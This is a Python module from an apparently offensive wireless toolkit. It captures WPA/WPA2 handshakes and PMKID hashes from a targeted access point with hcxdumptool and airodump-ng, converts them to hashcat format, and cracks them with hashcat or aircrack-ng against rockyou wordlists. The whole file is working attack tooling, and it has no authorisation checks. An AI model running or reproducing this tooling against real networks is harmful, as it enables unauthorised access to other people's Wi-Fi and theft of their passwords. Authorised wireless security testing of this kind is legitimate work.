"""
Handshake & PMKID Harvester
===========================
Captures WPA/WPA2 handshakes and PMKID hashes.
"""

import os
import time
import subprocess
from typing import Optional, Dict, Any
from dataclasses import dataclass

from bhisma.core.config import BhismaConfig
from bhisma.utils.constants import DEFAULT_CAPTURES_DIR
from bhisma.utils.helpers import ensure_dir, sanitize_filename
from bhisma.tools.binder import ToolBinder

from rich.console import Console

console = Console()


@dataclass
class HarvestResult:
    captured: bool = False
    handshake_file: Optional[str] = None
    pmkid_file: Optional[str] = None
    hashcat_file: Optional[str] = None
    message: str = ""


class HarvesterManager:
    """Captures WPA handshakes and PMKID hashes."""

    def __init__(self, iface: str, config: Optional[BhismaConfig] = None):
        self.iface = iface
        self.config = config or BhismaConfig.load()
        self.binder = ToolBinder()
        self.output_dir = ensure_dir(DEFAULT_CAPTURES_DIR)

    def capture(
        self,
        target_bssid: str,
        pmkid: bool = True,
        handshake: bool = True,
        channel: Optional[int] = None,
        output: Optional[str] = None,
        duration: int = 120,
    ) -> HarvestResult:
        """
        Capture PMKID and/or 4-way handshake from target.

        Args:
            target_bssid: Target AP BSSID
            pmkid: Capture PMKID (client-less)
            handshake: Capture 4-way handshake
            channel: Target channel (auto-detected if None)
            output: Output file path
            duration: Capture duration in seconds
        """
        result = HarvestResult()
        base_name = sanitize_filename(f"{target_bssid}_{int(time.time())}")
        out_file = output or os.path.join(self.output_dir, f"{base_name}.pcapng")

        console.print(f"[bold cyan][*] Harvester: targeting {target_bssid}[/bold cyan]")
        console.print(f"[dim]    Output: {out_file}[/dim]")

        if pmkid:
            result.pmkid_file = self._capture_pmkid(target_bssid, out_file, duration)
            if result.pmkid_file:
                result.captured = True
                console.print(f"[bold green][+] PMKID captured: {result.pmkid_file}[/bold green]")

        if handshake:
            result.handshake_file = self._capture_handshake(target_bssid, channel, out_file, duration)
            if result.handshake_file:
                result.captured = True
                console.print(f"[bold green][+] Handshake captured: {result.handshake_file}[/bold green]")

        # Convert to hashcat format
        if result.captured:
            result.hashcat_file = self._convert_to_hashcat(out_file)
            if result.hashcat_file:
                console.print(f"[bold green][+] Hashcat file: {result.hashcat_file}[/bold green]")

        if not result.captured:
            result.message = "No handshake or PMKID captured"
        else:
            result.message = f"Capture complete. Files: {result.handshake_file or 'N/A'} | {result.pmkid_file or 'N/A'}"

        return result

    def _capture_pmkid(self, bssid: str, out_file: str, duration: int) -> Optional[str]:
        """Use hcxdumptool for PMKID capture."""
        try:
            # Set filter for target BSSID
            filter_file = out_file.replace(".pcapng", "_filter.txt")
            with open(filter_file, "w") as f:
                f.write(bssid.replace(":", ""))

            result = self.binder.execute(
                "hcxdumptool",
                [
                    "-i", self.iface,
                    "-o", out_file,
                    "--enable_status=1",
                    "--filterlist_ap", filter_file,
                ],
                timeout=duration,
            )
            if result.return_code == 0 or os.path.exists(out_file):
                return out_file
        except Exception as e:
            console.print(f"[yellow]    PMKID capture warning: {e}[/yellow]")
        return None

    def _capture_handshake(
        self,
        bssid: str,
        channel: Optional[int],
        out_file: str,
        duration: int,
    ) -> Optional[str]:
        """Use airodump-ng for handshake capture with deauth trigger."""
        try:
            ch_arg = ["-c", str(channel)] if channel else []
            result = self.binder.execute(
                "airodump-ng",
                ["-w", out_file.replace(".pcapng", ""), "--output-format", "pcapng"]
                + ch_arg
                + ["--bssid", bssid, self.iface],
                timeout=duration,
            )
            # Check if pcapng was created
            pcap = out_file.replace(".pcapng", "-01.pcapng")
            if os.path.exists(pcap):
                return pcap
        except Exception as e:
            console.print(f"[yellow]    Handshake capture warning: {e}[/yellow]")
        return None

    def _convert_to_hashcat(self, pcap_file: str) -> Optional[str]:
        """Convert pcap to hashcat mode 22000 format."""
        hash_file = pcap_file.replace(".pcapng", "_22000.txt")
        try:
            result = self.binder.execute(
                "hcxpcapngtool",
                ["-o", hash_file, pcap_file],
                timeout=30,
            )
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                return hash_file
        except Exception:
            pass
        return None


class CrackManager:
    """Manages password cracking with AI-enhanced wordlist selection."""

    def __init__(self):
        self.binder = ToolBinder()

    def crack(
        self,
        hash_file: str,
        wordlist: Optional[str] = None,
        use_hashcat: bool = True,
        hash_mode: int = 22000,
    ) -> Dict[str, Any]:
        """Crack captured hashes using dictionary or brute-force."""
        result = {"cracked": False, "password": None, "time_sec": 0}

        if not os.path.exists(hash_file):
            console.print(f"[bold red][!] Hash file not found: {hash_file}[/bold red]")
            return result

        # Auto-download wordlist if not provided
        if not wordlist:
            wordlist = self._ensure_wordlist()

        console.print(f"[bold cyan][*] Cracking {hash_file} with {wordlist}[/bold cyan]")
        start = time.time()

        if use_hashcat:
            result = self._hashcat_crack(hash_file, wordlist, hash_mode)
        else:
            result = self._aircrack_crack(hash_file, wordlist)

        result["time_sec"] = time.time() - start
        return result

    def _hashcat_crack(self, hash_file: str, wordlist: str, mode: int) -> Dict[str, Any]:
        """Use hashcat for GPU-accelerated cracking."""
        try:
            out_file = hash_file.replace(".txt", "_cracked.txt")
            cmd_result = self.binder.execute(
                "hashcat",
                ["-m", str(mode), "-a", "0", hash_file, wordlist, "-o", out_file, "--force", "--potfile-disable"],
                timeout=3600,
            )
            if os.path.exists(out_file):
                with open(out_file, "r") as f:
                    lines = f.readlines()
                if lines:
                    # Parse hashcat output format: hash:password
                    last_line = lines[-1].strip()
                    if ":" in last_line:
                        password = last_line.split(":", 1)[-1]
                        console.print(f"[bold green][+] Password cracked: {password}[/bold green]")
                        return {"cracked": True, "password": password, "output": out_file}
        except Exception as e:
            console.print(f"[yellow]    Hashcat warning: {e}[/yellow]")
        return {"cracked": False, "password": None}

    def _aircrack_crack(self, hash_file: str, wordlist: str) -> Dict[str, Any]:
        """Fallback to aircrack-ng."""
        try:
            cmd_result = self.binder.execute(
                "aircrack-ng",
                [hash_file, "-w", wordlist],
                timeout=3600,
            )
            # Parse stdout for KEY FOUND
            if "KEY FOUND" in cmd_result.stdout:
                import re
                match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', cmd_result.stdout)
                if match:
                    password = match.group(1)
                    return {"cracked": True, "password": password}
        except Exception:
            pass
        return {"cracked": False, "password": None}

    def _ensure_wordlist(self) -> str:
        """Ensure a wordlist is available."""
        default = os.path.expanduser("~/.bhisma/wordlists/rockyou.txt")
        if os.path.exists(default):
            return default
        # Fallback to common paths
        for path in ["/usr/share/wordlists/rockyou.txt", "./rockyou.txt"]:
            if os.path.exists(path):
                return path
        console.print("[yellow][!] No wordlist found. Download or specify one.[/yellow]")
        return "rockyou.txt"
